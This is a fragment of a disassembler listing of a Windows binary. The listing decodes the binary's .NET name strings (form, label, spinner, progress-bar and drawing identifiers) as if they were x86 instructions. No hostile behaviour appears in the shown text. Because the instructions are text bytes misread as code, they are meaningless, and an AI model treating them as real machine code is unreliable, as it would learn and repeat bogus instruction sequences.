10006e2a:	36 35 33 46 42 34    	ss xor $0x34424633,%eax
10006e30:	43                   	inc    %ebx
10006e31:	30 7d 00             	xor    %bh,0x0(%ebp)
10006e34:	43                   	inc    %ebx
10006e35:	6f                   	outsl  %ds:(%esi),(%dx)
10006e36:	6d                   	insl   (%dx),%es:(%edi)
10006e37:	70 69                	jo     0x10006ea2
10006e39:	6c                   	insb   (%dx),%es:(%edi)
10006e3a:	65 72 47             	gs jb  0x10006e84
10006e3d:	65 6e                	outsb  %gs:(%esi),(%dx)
10006e3f:	65 72 61             	gs jb  0x10006ea3
10006e42:	74 65                	je     0x10006ea9
10006e44:	64 41                	fs inc %ecx
10006e46:	74 74                	je     0x10006ebc
10006e48:	72 69                	jb     0x10006eb3
10006e4a:	62 75 74             	bound  %esi,0x74(%ebp)
10006e4d:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
10006e51:	6c                   	insb   (%dx),%es:(%edi)
10006e52:	75 65                	jne    0x10006eb9
10006e54:	54                   	push   %esp
10006e55:	79 70                	jns    0x10006ec7
10006e57:	65 00 5f 5f          	add    %bl,%gs:0x5f(%edi)
10006e5b:	53                   	push   %ebx
10006e5c:	74 61                	je     0x10006ebf
10006e5e:	74 69                	je     0x10006ec9
10006e60:	63 41 72             	arpl   %eax,0x72(%ecx)
10006e63:	72 61                	jb     0x10006ec6
10006e65:	79 49                	jns    0x10006eb0
10006e67:	6e                   	outsb  %ds:(%esi),(%dx)
10006e68:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
10006e6f:	69 
10006e70:	7a 65                	jp     0x10006ed7
10006e72:	3d 32 36 38 00       	cmp    $0x383632,%eax
10006e77:	24 24                	and    $0x24,%al
10006e79:	6d                   	insl   (%dx),%es:(%edi)
10006e7a:	65 74 68             	gs je  0x10006ee5
10006e7d:	6f                   	outsl  %ds:(%esi),(%dx)
10006e7e:	64 30 78 36          	xor    %bh,%fs:0x36(%eax)
10006e82:	30 30                	xor    %dh,(%eax)
10006e84:	30 30                	xor    %dh,(%eax)
10006e86:	33 61 2d             	xor    0x2d(%ecx),%esp
10006e89:	31 00                	xor    %eax,(%eax)
10006e8b:	52                   	push   %edx
10006e8c:	75 6e                	jne    0x10006efc
10006e8e:	74 69                	je     0x10006ef9
10006e90:	6d                   	insl   (%dx),%es:(%edi)
10006e91:	65 48                	gs dec %eax
10006e93:	65 6c                	gs insb (%dx),%es:(%edi)
10006e95:	70 65                	jo     0x10006efc
10006e97:	72 73                	jb     0x10006f0c
10006e99:	00 41 72             	add    %al,0x72(%ecx)
10006e9c:	72 61                	jb     0x10006eff
10006e9e:	79 00                	jns    0x10006ea0
10006ea0:	52                   	push   %edx
10006ea1:	75 6e                	jne    0x10006f11
10006ea3:	74 69                	je     0x10006f0e
10006ea5:	6d                   	insl   (%dx),%es:(%edi)
10006ea6:	65 46                	gs inc %esi
10006ea8:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
10006eaf:	64 6c                	fs insb (%dx),%es:(%edi)
10006eb1:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
10006eb5:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
10006ebc:	65 
10006ebd:	41                   	inc    %ecx
10006ebe:	72 72                	jb     0x10006f32
10006ec0:	61                   	popa
10006ec1:	79 00                	jns    0x10006ec3
10006ec3:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
10006ec7:	65 6c                	gs insb (%dx),%es:(%edi)
10006ec9:	33 32                	xor    (%edx),%esi
10006ecb:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
10006ece:	6c                   	insb   (%dx),%es:(%edi)
10006ecf:	00 3c 3e             	add    %bh,(%esi,%edi,1)
10006ed2:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
10006ed5:	44                   	inc    %esp
10006ed6:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
10006edd:	6c                   	insb   (%dx),%es:(%edi)
10006ede:	61                   	popa
10006edf:	73 73                	jae    0x10006f54
10006ee1:	66 00 50 61          	data16 add %dl,0x61(%eax)
10006ee5:	6e                   	outsb  %ds:(%esi),(%dx)
10006ee6:	65 6c                	gs insb (%dx),%es:(%edi)
10006ee8:	00 64 6f 74          	add    %ah,0x74(%edi,%ebp,2)
10006eec:	73 50                	jae    0x10006f3e
10006eee:	61                   	popa
10006eef:	6e                   	outsb  %ds:(%esi),(%dx)
10006ef0:	65 6c                	gs insb (%dx),%es:(%edi)
10006ef2:	00 4c 61 62          	add    %cl,0x62(%ecx,%eiz,2)
10006ef6:	65 6c                	gs insb (%dx),%es:(%edi)
10006ef8:	00 6c 62 6c          	add    %ch,0x6c(%edx,%eiz,2)
10006efc:	4d                   	dec    %ebp
10006efd:	61                   	popa
10006efe:	69 6e 00 6c 62 6c 50 	imul   $0x506c626c,0x0(%esi),%ebp
10006f05:	65 72 63             	gs jb  0x10006f6b
10006f08:	65 6e                	outsb  %gs:(%esi),(%dx)
10006f0a:	74 00                	je     0x10006f0c
10006f0c:	6c                   	insb   (%dx),%es:(%edi)
10006f0d:	62 6c 53 75          	bound  %ebp,0x75(%ebx,%edx,2)
10006f11:	62 00                	bound  %eax,(%eax)
10006f13:	70 72                	jo     0x10006f87
10006f15:	6f                   	outsl  %ds:(%esi),(%dx)
10006f16:	67 72 65             	addr16 jb 0x10006f7e
10006f19:	73 73                	jae    0x10006f8e
10006f1b:	00 61 6e             	add    %ah,0x6e(%ecx)
10006f1e:	67 6c                	insb   (%dx),%es:(%di)
10006f20:	65 00 74 69 63       	add    %dh,%gs:0x63(%ecx,%ebp,2)
10006f25:	6b 43 6f 75          	imul   $0x75,0x6f(%ebx),%eax
10006f29:	6e                   	outsb  %ds:(%esi),(%dx)
10006f2a:	74 00                	je     0x10006f2c
10006f2c:	74 69                	je     0x10006f97
10006f2e:	63 6b 73             	arpl   %ebp,0x73(%ebx)
10006f31:	50                   	push   %eax
10006f32:	65 72 50             	gs jb  0x10006f85
10006f35:	65 72 63             	gs jb  0x10006f9b
10006f38:	65 6e                	outsb  %gs:(%esi),(%dx)
10006f3a:	74 00                	je     0x10006f3c
10006f3c:	50                   	push   %eax
10006f3d:	61                   	popa
10006f3e:	69 6e 74 45 76 65 6e 	imul   $0x6e657645,0x74(%esi),%ebp
10006f45:	74 41                	je     0x10006f88
10006f47:	72 67                	jb     0x10006fb0
10006f49:	73 00                	jae    0x10006f4b
10006f4b:	3c 53                	cmp    $0x53,%al
10006f4d:	68 6f 77 3e 62       	push   $0x623e776f
10006f52:	5f                   	pop    %edi
10006f53:	5f                   	pop    %edi
10006f54:	31 00                	xor    %eax,(%eax)
10006f56:	3c 53                	cmp    $0x53,%al
10006f58:	68 6f 77 3e 62       	push   $0x623e776f
10006f5d:	5f                   	pop    %edi
10006f5e:	5f                   	pop    %edi
10006f5f:	32 00                	xor    (%eax),%al
10006f61:	45                   	inc    %ebp
10006f62:	76 65                	jbe    0x10006fc9
10006f64:	6e                   	outsb  %ds:(%esi),(%dx)
10006f65:	74 41                	je     0x10006fa8
10006f67:	72 67                	jb     0x10006fd0
10006f69:	73 00                	jae    0x10006f6b
10006f6b:	3c 53                	cmp    $0x53,%al
10006f6d:	68 6f 77 3e 62       	push   $0x623e776f
10006f72:	5f                   	pop    %edi
10006f73:	5f                   	pop    %edi
10006f74:	36 00 3c 53          	add    %bh,%ss:(%ebx,%edx,2)
10006f78:	68 6f 77 3e 62       	push   $0x623e776f
10006f7d:	5f                   	pop    %edi
10006f7e:	5f                   	pop    %edi
10006f7f:	38 00                	cmp    %al,(%eax)
10006f81:	73 65                	jae    0x10006fe8
10006f83:	6e                   	outsb  %ds:(%esi),(%dx)
10006f84:	64 65 72 00          	fs gs jb 0x10006f88
10006f88:	3c 3e                	cmp    $0x3e,%al
10006f8a:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
10006f8d:	44                   	inc    %esp
10006f8e:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
10006f95:	6c                   	insb   (%dx),%es:(%edi)
10006f96:	61                   	popa
10006f97:	73 73                	jae    0x1000700c
10006f99:	31 31                	xor    %esi,(%ecx)
10006f9b:	00 43 53             	add    %al,0x53(%ebx)
10006f9e:	24 3c                	and    $0x3c,%al
10006fa0:	3e 38 5f 5f          	cmp    %bl,%ds:0x5f(%edi)
10006fa4:	6c                   	insb   (%dx),%es:(%edi)
10006fa5:	6f                   	outsl  %ds:(%esi),(%dx)
10006fa6:	63 61 6c             	arpl   %esp,0x6c(%ecx)
10006fa9:	73 31                	jae    0x10006fdc
10006fab:	30 00                	xor    %al,(%eax)
10006fad:	43                   	inc    %ebx
10006fae:	6f                   	outsl  %ds:(%esi),(%dx)
10006faf:	6c                   	insb   (%dx),%es:(%edi)
10006fb0:	6f                   	outsl  %ds:(%esi),(%dx)
10006fb1:	72 00                	jb     0x10006fb3
10006fb3:	62 61 6e             	bound  %esp,0x6e(%ecx)
10006fb6:	6b 54 65 78 74       	imul   $0x74,0x78(%ebp,%eiz,2),%edx
10006fbb:	00 73 70             	add    %dh,0x70(%ebx)
10006fbe:	69 6e 6e 65 72 43 6f 	imul   $0x6f437265,0x6e(%esi),%ebp
10006fc5:	6c                   	insb   (%dx),%es:(%edi)
10006fc6:	6f                   	outsl  %ds:(%esi),(%dx)
10006fc7:	72 00                	jb     0x10006fc9
10006fc9:	62 61 72             	bound  %esp,0x72(%ecx)
10006fcc:	57                   	push   %edi
10006fcd:	00 62 61             	add    %ah,0x61(%edx)
10006fd0:	72 46                	jb     0x10007018
10006fd2:	69 6c 6c 36 00 6c 62 	imul   $0x6c626c00,0x36(%esp,%ebp,2),%ebp
10006fd9:	6c 
10006fda:	50                   	push   %eax
10006fdb:	63 74 36 00          	arpl   %esi,0x0(%esi,%esi,1)
10006fdf:	6d                   	insl   (%dx),%es:(%edi)
10006fe0:	73 67                	jae    0x10007049
10006fe2:	73 36                	jae    0x1000701a
10006fe4:	00 6d 73             	add    %ch,0x73(%ebp)
10006fe7:	67 49                	addr16 dec %ecx
10006fe9:	64 78 36             	fs js  0x10007022
10006fec:	00 70 72             	add    %dh,0x72(%eax)
10006fef:	6f                   	outsl  %ds:(%esi),(%dx)
10006ff0:	67 36 00 74 69       	add    %dh,%ss:0x69(%si)
10006ff5:	63 6b 36             	arpl   %ebp,0x36(%ebx)
10006ff8:	00 62 6e             	add    %ah,0x6e(%edx)
10006ffb:	6b 41 63 63          	imul   $0x63,0x63(%ecx),%eax
10006fff:	65 6e                	outsb  %gs:(%esi),(%dx)
10007001:	74 00                	je     0x10007003
10007003:	70 63                	jo     0x10007068
10007005:	74 73                	je     0x1000707a
10007007:	45                   	inc    %ebp
10007008:	00 64 65 73          	add    %ah,0x73(%ebp,%eiz,2)
1000700c:	63 73 45             	arpl   %esi,0x45(%ebx)
1000700f:	00 63 68             	add    %ah,0x68(%ebx)
10007012:	65 63 6b 73          	arpl   %ebp,%gs:0x73(%ebx)
10007016:	45                   	inc    %ebp
10007017:	00 62 61             	add    %ah,0x61(%edx)
1000701a:	72 42                	jb     0x1000705e
1000701c:	67 73 45             	addr16 jae 0x10007064
1000701f:	00 62 61             	add    %ah,0x61(%edx)
10007022:	72 73                	jb     0x10007097
10007024:	45                   	inc    %ebp
10007025:	00 6e 75             	add    %ch,0x75(%esi)
10007028:	6d                   	insl   (%dx),%es:(%edi)
10007029:	73 45                	jae    0x10007070
1000702b:	00 64 65 73          	add    %ah,0x73(%ebp,%eiz,2)
1000702f:	63 4d 73             	arpl   %ecx,0x73(%ebp)
10007032:	67 73 00             	addr16 jae 0x10007035
10007035:	6d                   	insl   (%dx),%es:(%edi)
10007036:	62 42 67             	bound  %eax,0x67(%edx)
10007039:	00 6d 62             	add    %ch,0x62(%ebp)
1000703c:	46                   	inc    %esi
1000703d:	69 6c 6c 00 6d 62 50 	imul   $0x6350626d,0x0(%esp,%ebp,2),%ebp
10007044:	63 
10007045:	74 00                	je     0x10007047
10007047:	6c                   	insb   (%dx),%es:(%edi)
10007048:	6f                   	outsl  %ds:(%esi),(%dx)
10007049:	67 54                	addr16 push %esp
1000704b:	65 78 74             	gs js  0x100070c2
1000704e:	00 70 72             	add    %dh,0x72(%eax)
10007051:	6f                   	outsl  %ds:(%esi),(%dx)
10007052:	67 45                	addr16 inc %ebp
10007054:	00 73 74             	add    %dh,0x74(%ebx)
10007057:	65 70 45             	gs jo  0x1000709f
1000705a:	00 74 69 63          	add    %dh,0x63(%ecx,%ebp,2)
1000705e:	6b 45 00 6c          	imul   $0x6c,0x0(%ebp),%eax
10007062:	6f                   	outsl  %ds:(%esi),(%dx)
10007063:	67 4d                	addr16 dec %ebp
10007065:	73 67                	jae    0x100070ce
10007067:	73 00                	jae    0x10007069
10007069:	3c 53                	cmp    $0x53,%al
1000706b:	68 6f 77 3e 62       	push   $0x623e776f
10007070:	5f                   	pop    %edi
10007071:	5f                   	pop    %edi
10007072:	33 00                	xor    (%eax),%eax
10007074:	3c 53                	cmp    $0x53,%al
10007076:	68 6f 77 3e 62       	push   $0x623e776f
1000707b:	5f                   	pop    %edi
1000707c:	5f                   	pop    %edi
1000707d:	34 00                	xor    $0x0,%al
1000707f:	3c 53                	cmp    $0x53,%al
10007081:	68 6f 77 3e 62       	push   $0x623e776f
10007086:	5f                   	pop    %edi
10007087:	5f                   	pop    %edi
10007088:	35 00 3c 53 68       	xor    $0x68533c00,%eax
1000708d:	6f                   	outsl  %ds:(%esi),(%dx)
1000708e:	77 3e                	ja     0x100070ce
10007090:	62 5f 5f             	bound  %ebx,0x5f(%edi)
10007093:	30 00                	xor    %al,(%eax)
10007095:	43                   	inc    %ebx
10007096:	53                   	push   %ebx
10007097:	24 3c                	and    $0x3c,%al
10007099:	3e 39 5f 5f          	cmp    %ebx,%ds:0x5f(%edi)
1000709d:	43                   	inc    %ebx
1000709e:	61                   	popa
1000709f:	63 68 65             	arpl   %ebp,0x65(%eax)
100070a2:	64 41                	fs inc %ecx
100070a4:	6e                   	outsb  %ds:(%esi),(%dx)
100070a5:	6f                   	outsl  %ds:(%esi),(%dx)
100070a6:	6e                   	outsb  %ds:(%esi),(%dx)
100070a7:	79 6d                	jns    0x10007116
100070a9:	6f                   	outsl  %ds:(%esi),(%dx)
100070aa:	75 73                	jne    0x1000711f
100070ac:	4d                   	dec    %ebp
100070ad:	65 74 68             	gs je  0x10007118
100070b0:	6f                   	outsl  %ds:(%esi),(%dx)
100070b1:	64 44                	fs inc %esp
100070b3:	65 6c                	gs insb (%dx),%es:(%edi)
100070b5:	65 67 61             	gs addr16 popa
100070b8:	74 65                	je     0x1000711f
100070ba:	61                   	popa
100070bb:	00 46 6f             	add    %al,0x6f(%esi)
100070be:	72 6d                	jb     0x1000712d
100070c0:	43                   	inc    %ebx
100070c1:	6c                   	insb   (%dx),%es:(%edi)
100070c2:	6f                   	outsl  %ds:(%esi),(%dx)
100070c3:	73 69                	jae    0x1000712e
100070c5:	6e                   	outsb  %ds:(%esi),(%dx)
100070c6:	67 45                	addr16 inc %ebp
100070c8:	76 65                	jbe    0x1000712f
100070ca:	6e                   	outsb  %ds:(%esi),(%dx)
100070cb:	74 41                	je     0x1000710e
100070cd:	72 67                	jb     0x10007136
100070cf:	73 00                	jae    0x100070d1
100070d1:	3c 53                	cmp    $0x53,%al
100070d3:	68 6f 77 3e 62       	push   $0x623e776f
100070d8:	5f                   	pop    %edi
100070d9:	5f                   	pop    %edi
100070da:	37                   	aaa
100070db:	00 46 6f             	add    %al,0x6f(%esi)
100070de:	72 6d                	jb     0x1000714d
100070e0:	43                   	inc    %ebx
100070e1:	6c                   	insb   (%dx),%es:(%edi)
100070e2:	6f                   	outsl  %ds:(%esi),(%dx)
100070e3:	73 69                	jae    0x1000714e
100070e5:	6e                   	outsb  %ds:(%esi),(%dx)
100070e6:	67 45                	addr16 inc %ebp
100070e8:	76 65                	jbe    0x1000714f
100070ea:	6e                   	outsb  %ds:(%esi),(%dx)
100070eb:	74 48                	je     0x10007135
100070ed:	61                   	popa
100070ee:	6e                   	outsb  %ds:(%esi),(%dx)
100070ef:	64 6c                	fs insb (%dx),%es:(%edi)
100070f1:	65 72 00             	gs jb  0x100070f4
100070f4:	43                   	inc    %ebx
100070f5:	53                   	push   %ebx
100070f6:	24 3c                	and    $0x3c,%al
100070f8:	3e 39 5f 5f          	cmp    %ebx,%ds:0x5f(%edi)
100070fc:	43                   	inc    %ebx
100070fd:	61                   	popa
100070fe:	63 68 65             	arpl   %ebp,0x65(%eax)
10007101:	64 41                	fs inc %ecx
10007103:	6e                   	outsb  %ds:(%esi),(%dx)
10007104:	6f                   	outsl  %ds:(%esi),(%dx)
10007105:	6e                   	outsb  %ds:(%esi),(%dx)
10007106:	79 6d                	jns    0x10007175
10007108:	6f                   	outsl  %ds:(%esi),(%dx)
10007109:	75 73                	jne    0x1000717e
1000710b:	4d                   	dec    %ebp
1000710c:	65 74 68             	gs je  0x10007177
1000710f:	6f                   	outsl  %ds:(%esi),(%dx)
10007110:	64 44                	fs inc %esp
10007112:	65 6c                	gs insb (%dx),%es:(%edi)
10007114:	65 67 61             	gs addr16 popa
10007117:	74 65                	je     0x1000717e
10007119:	62 00                	bound  %eax,(%eax)
1000711b:	3c 53                	cmp    $0x53,%al
1000711d:	68 6f 77 3e 62       	push   $0x623e776f
10007122:	5f                   	pop    %edi
10007123:	5f                   	pop    %edi
10007124:	39 00                	cmp    %eax,(%eax)
10007126:	65 76 00             	gs jbe 0x10007129
10007129:	45                   	inc    %ebp
1000712a:	76 65                	jbe    0x10007191
1000712c:	6e                   	outsb  %ds:(%esi),(%dx)
1000712d:	74 48                	je     0x10007177
1000712f:	61                   	popa
10007130:	6e                   	outsb  %ds:(%esi),(%dx)
10007131:	64 6c                	fs insb (%dx),%es:(%edi)
10007133:	65 72 00             	gs jb  0x10007136
10007136:	43                   	inc    %ebx
10007137:	53                   	push   %ebx
10007138:	24 3c                	and    $0x3c,%al
1000713a:	3e 39 5f 5f          	cmp    %ebx,%ds:0x5f(%edi)
1000713e:	43                   	inc    %ebx
1000713f:	61                   	popa
10007140:	63 68 65             	arpl   %ebp,0x65(%eax)
10007143:	64 41                	fs inc %ecx
10007145:	6e                   	outsb  %ds:(%esi),(%dx)
10007146:	6f                   	outsl  %ds:(%esi),(%dx)
10007147:	6e                   	outsb  %ds:(%esi),(%dx)
10007148:	79 6d                	jns    0x100071b7
1000714a:	6f                   	outsl  %ds:(%esi),(%dx)
1000714b:	75 73                	jne    0x100071c0
1000714d:	4d                   	dec    %ebp
1000714e:	65 74 68             	gs je  0x100071b9
10007151:	6f                   	outsl  %ds:(%esi),(%dx)
10007152:	64 44                	fs inc %esp
10007154:	65 6c                	gs insb (%dx),%es:(%edi)
10007156:	65 67 61             	gs addr16 popa
10007159:	74 65                	je     0x100071c0
1000715b:	63 00                	arpl   %eax,(%eax)
1000715d:	47                   	inc    %edi
1000715e:	72 61                	jb     0x100071c1
10007160:	70 68                	jo     0x100071ca
10007162:	69 63 73 00 67 65 74 	imul   $0x74656700,0x73(%ebx),%esp
10007169:	5f                   	pop    %edi
1000716a:	47                   	inc    %edi
1000716b:	72 61                	jb     0x100071ce
1000716d:	70 68                	jo     0x100071d7
1000716f:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
10007176:	74 65                	je     0x100071dd
10007178:	6d                   	insl   (%dx),%es:(%edi)
10007179:	2e 44                	cs inc %esp
1000717b:	72 61                	jb     0x100071de
1000717d:	77 69                	ja     0x100071e8
1000717f:	6e                   	outsb  %ds:(%esi),(%dx)
10007180:	67 2e 44             	addr16 cs inc %esp
10007183:	72 61                	jb     0x100071e6
10007185:	77 69                	ja     0x100071f0
10007187:	6e                   	outsb  %ds:(%esi),(%dx)
10007188:	67 32 44 00          	xor    0x0(%si),%al
1000718c:	53                   	push   %ebx
1000718d:	6d                   	insl   (%dx),%es:(%edi)
1000718e:	6f                   	outsl  %ds:(%esi),(%dx)
1000718f:	6f                   	outsl  %ds:(%esi),(%dx)
10007190:	74 68                	je     0x100071fa
10007192:	69 6e 67 4d 6f 64 65 	imul   $0x65646f4d,0x67(%esi),%ebp
10007199:	00 73 65             	add    %dh,0x65(%ebx)
1000719c:	74 5f                	je     0x100071fd
1000719e:	53                   	push   %ebx
1000719f:	6d                   	insl   (%dx),%es:(%edi)
100071a0:	6f                   	outsl  %ds:(%esi),(%dx)
100071a1:	6f                   	outsl  %ds:(%esi),(%dx)
100071a2:	74 68                	je     0x1000720c
100071a4:	69 6e 67 4d 6f 64 65 	imul   $0x65646f4d,0x67(%esi),%ebp
100071ab:	00 43 6f             	add    %al,0x6f(%ebx)
100071ae:	6e                   	outsb  %ds:(%esi),(%dx)
100071af:	74 72                	je     0x10007223
100071b1:	6f                   	outsl  %ds:(%esi),(%dx)
100071b2:	6c                   	insb   (%dx),%es:(%edi)
100071b3:	00 67 65             	add    %ah,0x65(%edi)
100071b6:	74 5f                	je     0x10007217
100071b8:	57                   	push   %edi
100071b9:	69 64 74 68 00 67 65 	imul   $0x74656700,0x68(%esp,%esi,2),%esp
100071c0:	74 
100071c1:	5f                   	pop    %edi
100071c2:	48                   	dec    %eax
100071c3:	65 69 67 68 74 00 4d 	imul   $0x614d0074,%gs:0x68(%edi),%esp
100071ca:	61 
100071cb:	74 68                	je     0x10007235
100071cd:	00 43 6f             	add    %al,0x6f(%ebx)
100071d0:	73 00                	jae    0x100071d2
100071d2:	53                   	push   %ebx
100071d3:	69 6e 00 46 72 6f 6d 	imul   $0x6d6f7246,0x0(%esi),%ebp
100071da:	41                   	inc    %ecx
100071db:	72 67                	jb     0x10007244
100071dd:	62 00                	bound  %eax,(%eax)
100071df:	53                   	push   %ebx
100071e0:	6f                   	outsl  %ds:(%esi),(%dx)
100071e1:	6c                   	insb   (%dx),%es:(%edi)
100071e2:	69 64 42 72 75 73 68 	imul   $0x687375,0x72(%edx,%eax,2),%esp
100071e9:	00 
100071ea:	42                   	inc    %edx
100071eb:	72 75                	jb     0x10007262
100071ed:	73 68                	jae    0x10007257
100071ef:	00 46 69             	add    %al,0x69(%esi)
100071f2:	6c                   	insb   (%dx),%es:(%edi)
100071f3:	6c                   	insb   (%dx),%es:(%edi)
100071f4:	45                   	inc    %ebp
100071f5:	6c                   	insb   (%dx),%es:(%edi)
100071f6:	6c                   	insb   (%dx),%es:(%edi)
100071f7:	69 70 73 65 00 49 44 	imul   $0x44490065,0x73(%eax),%esi
100071fe:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
10007205:	6c                   	insb   (%dx),%es:(%edi)
10007206:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
1000720b:	70 6f                	jo     0x1000727c
1000720d:	73 65                	jae    0x10007274
1000720f:	00 50 65             	add    %dl,0x65(%eax)
10007212:	6e                   	outsb  %ds:(%esi),(%dx)
10007213:	00 44 72 61          	add    %al,0x61(%edx,%esi,2)
10007217:	77 45                	ja     0x1000725e
10007219:	6c                   	insb   (%dx),%es:(%edi)
1000721a:	6c                   	insb   (%dx),%es:(%edi)
1000721b:	69 70 73 65 00 4c 69 	imul   $0x694c0065,0x73(%eax),%esi
10007222:	6e                   	outsb  %ds:(%esi),(%dx)
10007223:	65 43                	gs inc %ebx
10007225:	61                   	popa
10007226:	70 00                	jo     0x10007228
10007228:	73 65                	jae    0x1000728f
1000722a:	74 5f                	je     0x1000728b
1000722c:	53                   	push   %ebx
1000722d:	74 61                	je     0x10007290
1000722f:	72 74                	jb     0x100072a5
10007231:	43                   	inc    %ebx
10007232:	61                   	popa
10007233:	70 00                	jo     0x10007235
10007235:	73 65                	jae    0x1000729c
10007237:	74 5f                	je     0x10007298
10007239:	45                   	inc    %ebp
1000723a:	6e                   	outsb  %ds:(%esi),(%dx)
1000723b:	64 43                	fs inc %ebx
1000723d:	61                   	popa
1000723e:	70 00                	jo     0x10007240
10007240:	44                   	inc    %esp
10007241:	72 61                	jb     0x100072a4
10007243:	77 41                	ja     0x10007286
10007245:	72 63                	jb     0x100072aa
10007247:	00 49 6e             	add    %cl,0x6e(%ecx)
1000724a:	76 61                	jbe    0x100072ad
1000724c:	6c                   	insb   (%dx),%es:(%edi)
1000724d:	69 64 61 74 65 00 73 	imul   $0x65730065,0x74(%ecx,%eiz,2),%esp
10007254:	65 
10007255:	74 5f                	je     0x100072b6
10007257:	57                   	push   %edi
10007258:	69 64 74 68 00 43 6f 	imul   $0x6e6f4300,0x68(%esp,%esi,2),%esp
1000725f:	6e 
10007260:	63 61 74             	arpl   %esp,0x74(%ecx)
10007263:	00 73 65             	add    %dh,0x65(%ebx)
10007266:	74 5f                	je     0x100072c7
10007268:	54                   	push   %esp
10007269:	65 78 74             	gs js  0x100072e0
1000726c:	00 73 65             	add    %dh,0x65(%ebx)
1000726f:	74 5f                	je     0x100072d0
10007271:	54                   	push   %esp
10007272:	6f                   	outsl  %ds:(%esi),(%dx)
10007273:	70 4d                	jo     0x100072c2
10007275:	6f                   	outsl  %ds:(%esi),(%dx)
10007276:	73 74                	jae    0x100072ec
10007278:	00 67 65             	add    %ah,0x65(%edi)
1000727b:	74 5f                	je     0x100072dc
1000727d:	48                   	dec    %eax
1000727e:	61                   	popa
1000727f:	6e                   	outsb  %ds:(%esi),(%dx)
10007280:	64 6c                	fs insb (%dx),%es:(%edi)
10007282:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
10007286:	74 5f                	je     0x100072e7
10007288:	42                   	inc    %edx
10007289:	61                   	popa
1000728a:	63 6b 43             	arpl   %ebp,0x43(%ebx)
1000728d:	6f                   	outsl  %ds:(%esi),(%dx)
1000728e:	6c                   	insb   (%dx),%es:(%edi)
1000728f:	6f                   	outsl  %ds:(%esi),(%dx)
10007290:	72 00                	jb     0x10007292
10007292:	73 65                	jae    0x100072f9
10007294:	74 5f                	je     0x100072f5
10007296:	56                   	push   %esi
10007297:	69 73 69 62 6c 65 00 	imul   $0x656c62,0x69(%ebx),%esi
1000729e:	73 65                	jae    0x10007305
100072a0:	74 5f                	je     0x10007301
100072a2:	46                   	inc    %esi
100072a3:	6f                   	outsl  %ds:(%esi),(%dx)
100072a4:	72 65                	jb     0x1000730b
100072a6:	43                   	inc    %ebx
100072a7:	6f                   	outsl  %ds:(%esi),(%dx)
100072a8:	6c                   	insb   (%dx),%es:(%edi)
100072a9:	6f                   	outsl  %ds:(%esi),(%dx)
100072aa:	72 00                	jb     0x100072ac
100072ac:	67 65 74 5f          	addr16 gs je 0x1000730f
100072b0:	47                   	inc    %edi
100072b1:	72 61                	jb     0x10007314
100072b3:	79 00                	jns    0x100072b5
100072b5:	44                   	inc    %esp
100072b6:	61                   	popa
100072b7:	74 65                	je     0x1000731e
100072b9:	54                   	push   %esp
100072ba:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
100072c1:	5f                   	pop    %edi
100072c2:	4e                   	dec    %esi
100072c3:	6f                   	outsl  %ds:(%esi),(%dx)
100072c4:	77 00                	ja     0x100072c6
100072c6:	67 65 74 5f          	addr16 gs je 0x10007329
100072ca:	54                   	push   %esp
100072cb:	65 78 74             	gs js  0x10007342
100072ce:	00 53 70             	add    %dl,0x70(%ebx)
100072d1:	6c                   	insb   (%dx),%es:(%edi)
100072d2:	69 74 00 53 63 72 65 	imul   $0x65657263,0x53(%eax,%eax,1),%esi
100072d9:	65 
100072da:	6e                   	outsb  %ds:(%esi),(%dx)
100072db:	00 67 65             	add    %ah,0x65(%edi)
100072de:	74 5f                	je     0x1000733f
100072e0:	50                   	push   %eax
100072e1:	72 69                	jb     0x1000734c
100072e3:	6d                   	insl   (%dx),%es:(%edi)
100072e4:	61                   	popa
100072e5:	72 79                	jb     0x10007360
100072e7:	53                   	push   %ebx
100072e8:	63 72 65             	arpl   %esi,0x65(%edx)
100072eb:	65 6e                	outsb  %gs:(%esi),(%dx)
100072ed:	00 52 65             	add    %dl,0x65(%edx)
100072f0:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
100072f4:	67 6c                	insb   (%dx),%es:(%di)
100072f6:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
100072fa:	74 5f                	je     0x1000735b
100072fc:	42                   	inc    %edx
100072fd:	6f                   	outsl  %ds:(%esi),(%dx)
100072fe:	75 6e                	jne    0x1000736e
10007300:	64 73 00             	fs jae 0x10007303
10007303:	53                   	push   %ebx
10007304:	79 73                	jns    0x10007379
10007306:	74 65                	je     0x1000736d
10007308:	6d                   	insl   (%dx),%es:(%edi)
10007309:	49                   	dec    %ecx
1000730a:	6e                   	outsb  %ds:(%esi),(%dx)
1000730b:	66 6f                	outsw  %ds:(%esi),(%dx)
1000730d:	72 6d                	jb     0x1000737c
1000730f:	61                   	popa
10007310:	74 69                	je     0x1000737b
10007312:	6f                   	outsl  %ds:(%esi),(%dx)
10007313:	6e                   	outsb  %ds:(%esi),(%dx)
10007314:	00 67 65             	add    %ah,0x65(%edi)
10007317:	74 5f                	je     0x10007378
10007319:	56                   	push   %esi
1000731a:	69 72 74 75 61 6c 53 	imul   $0x536c6175,0x74(%edx),%esi
10007321:	63 72 65             	arpl   %esi,0x65(%edx)
10007324:	65 6e                	outsb  %gs:(%esi),(%dx)
10007326:	00 67 65             	add    %ah,0x65(%edi)
10007329:	74 5f                	je     0x1000738a
1000732b:	58                   	pop    %eax
1000732c:	00 67 65             	add    %ah,0x65(%edi)
1000732f:	74 5f                	je     0x10007390
10007331:	59                   	pop    %ecx
10007332:	00 73 65             	add    %dh,0x65(%ebx)
10007335:	74 5f                	je     0x10007396
10007337:	4c                   	dec    %esp
